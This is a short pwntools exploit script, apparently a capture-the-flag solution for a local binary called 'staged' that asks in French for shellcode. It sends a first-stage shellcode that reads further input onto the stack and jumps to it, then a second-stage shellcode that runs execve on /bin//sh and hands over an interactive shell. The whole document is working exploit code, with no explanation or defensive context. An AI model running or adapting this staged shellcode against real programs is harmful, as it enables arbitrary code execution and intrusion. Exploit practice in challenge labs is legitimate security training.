from pwn import *

exe = ELF('./staged')
context.arch = 'amd64'

def conn():
    if args.GDB:
        return gdb.debug(exe.path)
    else:
        return process(exe.path)

shellcode1 = asm(f'''
    xor rax, rax
    xor rdi, rdi
    mov rsi, rsp
    mov rdx, 0x100
    syscall
    jmp rsi
''')

io = conn()
io.sendafter(b"Entrez votre shellcode : ", shellcode1)

shellcode2 = asm('''
    xor rsi, rsi
    xor rdx, rdx
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    push 59
    pop rax
    syscall
''')
io.send(shellcode2)
io.interactive()